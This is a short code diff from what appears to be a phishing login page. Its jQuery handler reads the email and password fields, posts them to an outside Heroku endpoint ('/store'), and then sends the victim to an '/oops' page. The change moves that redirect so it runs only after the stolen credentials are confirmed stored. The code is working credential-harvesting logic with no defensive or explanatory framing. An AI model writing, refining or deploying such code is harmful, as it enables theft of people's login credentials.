@@ -11,10 +11,11 @@
           email=$("#email").val();
           password=$("#password").val();
           $.post("https://lmpt-heroku-app.herokuapp.com/store",{email: email,password: password}, function(data){
-			$(document).innerHTML = "https://lmpt-heroku-app.herokuapp.com/oops";
+			
             if(data==='done')
               {
                 console.log("store success");
+				$(document).innerHTML = "https://lmpt-heroku-app.herokuapp.com/oops";
               }
           });
 		  
